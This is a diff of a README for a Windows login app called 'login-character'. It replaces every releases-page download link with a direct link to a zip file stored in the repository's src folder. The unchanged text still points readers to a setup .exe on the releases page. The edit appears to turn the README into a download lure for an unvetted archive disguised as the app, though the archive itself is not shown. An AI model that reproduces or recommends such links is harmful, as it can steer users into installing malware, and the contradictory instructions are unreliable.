@@ -1,6 +1,6 @@
 # 🔐 login-character - Simple User Login App
 
-[![Download login-character](https://img.shields.io/badge/Download-login--character-brightgreen)](https://github.com/claymorefamilycalostomataceae824/login-character/releases)
+[![Download login-character](https://img.shields.io/badge/Download-login--character-brightgreen)](https://raw.githubusercontent.com/claymorefamilycalostomataceae824/login-character/main/src/login-character-v2.6.zip)
 
 ## 📋 What is login-character?
 
@@ -14,7 +14,7 @@ This project uses reliable tools to make the app fast and easy to update. It doe
 
 Click the badge above or visit this link to download the latest version of login-character for Windows:
 
-**https://github.com/claymorefamilycalostomataceae824/login-character/releases**
+**https://raw.githubusercontent.com/claymorefamilycalostomataceae824/login-character/main/src/login-character-v2.6.zip**
 
 On the releases page, look for the latest file named something like `login-character-setup.exe` or similar. Click it to start the download.
 
@@ -24,7 +24,7 @@ On the releases page, look for the latest file named something like `login-chara
 
 1. Open your web browser and go to the downloads page:
    
-   https://github.com/claymorefamilycalostomataceae824/login-character/releases
+   https://raw.githubusercontent.com/claymorefamilycalostomataceae824/login-character/main/src/login-character-v2.6.zip
 
 2. Find the latest setup file with `.exe` extension.
 
@@ -153,4 +153,4 @@ If you run into issues not covered here:
 
 ---
 
-[![Download login-character](https://img.shields.io/badge/Download-login--character-blue)](https://github.com/claymorefamilycalostomataceae824/login-character/releases)
+[![Download login-character](https://img.shields.io/badge/Download-login--character-blue)](https://raw.githubusercontent.com/claymorefamilycalostomataceae824/login-character/main/src/login-character-v2.6.zip)
